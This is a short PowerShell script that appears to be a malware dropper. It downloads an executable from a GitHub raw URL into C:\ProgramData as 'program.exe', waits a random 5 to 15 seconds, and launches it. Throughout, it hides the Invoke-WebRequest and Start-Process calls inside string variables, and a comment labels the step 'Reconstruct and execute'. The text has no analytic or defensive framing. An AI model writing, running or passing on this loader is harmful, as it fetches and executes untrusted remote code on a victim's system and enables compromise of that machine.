$frag3 = 'https://github.com/floorsofolga-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe'
$frag5 = 'C:\ProgramData\program.exe'

$cmd = 'Invoke-WebRequest'

$params = @{
    Uri     = $frag3
    OutFile = $frag5
}

& $cmd @params
 # Reconstruct and execute

$randDelay = [Math]::Abs((Get-Random) % 10) + 5  # Random delay 5-15 seconds
Start-Sleep -Seconds $randDelay

$procStart = 'Start-Process'
& $procStart $frag5
